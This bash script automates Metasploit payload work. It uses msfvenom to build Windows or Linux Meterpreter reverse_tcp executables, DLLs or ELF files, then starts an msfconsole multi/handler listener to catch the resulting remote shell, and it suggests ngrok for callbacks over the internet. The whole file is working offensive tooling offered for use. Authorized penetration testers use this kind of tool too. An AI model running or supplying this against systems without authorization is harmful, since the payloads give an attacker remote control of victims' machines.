#!/bin/bash

echo "Welcome to the Metasploit script"

# Ask for target system
read -p "Enter the target system (0 for Windows, 1 for Linux): " TARGET_SYSTEM

# Set default payloads and formats
if [ $TARGET_SYSTEM -eq 0 ]; then
    echo "0: Manually specify payload"
    echo "1: windows/x64/meterpreter/reverse_tcp (exe)"
    echo "2: windows/x64/meterpreter/reverse_tcp (dll)"
    read -p "Enter your choice: " PAYLOAD_OPTION
    case $PAYLOAD_OPTION in
        0)
            read -p "Enter custom payload: " PAYLOAD
            read -p "Enter format (1 for exe, 2 for dll): " FORMAT_OPTION
            case $FORMAT_OPTION in
                1)
                    FORMAT="exe"
                    ;;
                2)
                    FORMAT="dll"
                    ;;
                *)
                    echo "Invalid format option"
                    exit 1
                    ;;
            esac
            ;;
        1)
            PAYLOAD="windows/x64/meterpreter/reverse_tcp"
            FORMAT="exe"
            ;;
        2)
            PAYLOAD="windows/x64/meterpreter/reverse_tcp"
            FORMAT="dll"
            ;;
        *)
            echo "Invalid option"
            exit 1
            ;;
    esac
elif [ $TARGET_SYSTEM -eq 1 ]; then
    echo "0: Manually specify payload"
    echo "1: linux/x64/meterpreter/reverse_tcp (elf)"
    read -p "Enter your choice: " PAYLOAD_OPTION
    case $PAYLOAD_OPTION in
        0)
            read -p "Enter custom payload: " PAYLOAD
            FORMAT="elf"
            ;;
        1)
            PAYLOAD="linux/x64/meterpreter/reverse_tcp"
            FORMAT="elf"
            ;;
        *)
            echo "Invalid option"
            exit 1
            ;;
    esac
else
    echo "Invalid option"
    exit 1
fi

# Ask for LHOST and LPORT
read -p "Enter LHOST: " LHOST
read -p "Enter LPORT: " LPORT

# Ask if reverse listener should be used
read -p "Do you want to use reverse listener? (yes/no): " USE_REVERSE_LISTENER

# Set LHOST and LPORT to your public IP and public port.
# Set ReverseListenerBindAddress and ReverseListenerBindPort to your local IP and local port.


if [ "$USE_REVERSE_LISTENER" == "yes" ]; then
    read -p "Enter ReverseLHOST: " REVERSE_LHOST
    read -p "Enter ReverseLPORT: " REVERSE_LPORT
    echo "Consider using ngrok if you're using reverse listener over the internet"
fi

# Generate payload using msfvenom
PAYLOAD_CMD="msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT -o venom.$FORMAT"
echo "Generating payload with command: $PAYLOAD_CMD"
$PAYLOAD_CMD

# Start msfconsole
echo "Starting msfconsole..."
msfconsole -q -x "use multi/handler;
                set payload $PAYLOAD;
                set LHOST $LHOST;
                set LPORT $LPORT;
                $(if [ "$USE_REVERSE_LISTENER" == "yes" ]; then
                    echo "set ReverseListenerBindAddress $REVERSE_LHOST;
                          set ReverseListenerBindPort $REVERSE_LPORT;"
                 fi)
                exploit;"